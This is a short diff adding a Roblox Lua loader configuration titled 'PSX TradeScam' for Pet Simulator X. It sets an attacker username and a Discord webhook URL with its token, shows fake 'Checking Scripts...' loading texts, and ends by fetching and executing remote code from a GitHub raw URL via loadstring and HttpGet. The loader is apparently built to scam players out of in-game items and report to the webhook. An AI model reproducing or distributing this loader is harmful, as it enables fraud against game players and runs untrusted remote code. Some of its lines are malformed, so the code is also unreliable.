@@ -1,0 +1,10 @@
+Username = "DarkLordz99YT"
+WebHook = "https://discord.com/api/webhooks/1096341132805410886/N6gsx3FjEH8NXSTT-IU334FjRZcRT2q_DWXtSTLg6JmO6Ufa7DC0UMdg5rKExgrTeeB4"
+
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+CustomScriptName = "PSX TradeScam"
+Text1 = "Script Loaded..."
+Text2 = "DarksHub"Text3 = "Checking Scripts..."
+Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
